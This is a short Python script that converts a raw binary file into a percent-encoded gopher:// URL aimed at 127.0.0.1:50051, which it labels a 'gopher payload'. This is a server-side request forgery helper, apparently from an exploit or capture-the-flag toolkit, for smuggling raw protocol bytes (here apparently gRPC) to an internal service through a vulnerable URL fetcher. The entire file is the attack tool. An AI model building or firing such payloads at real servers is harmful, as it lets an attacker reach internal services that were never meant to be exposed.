#!/usr/bin/python3

import sys
import urllib.parse

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <input_raw_file> <output_txt>")
    sys.exit(1)

with open(sys.argv[1], "rb") as f:
    raw = f.read()

encoded = ''.join([f"%{b:02X}" for b in raw])
gopher = f"gopher://127.0.0.1:50051/_{encoded}"

with open(sys.argv[2], "w") as f:
    f.write(gopher)

print(f"[+] Saved gopher payload to {sys.argv[2]}")
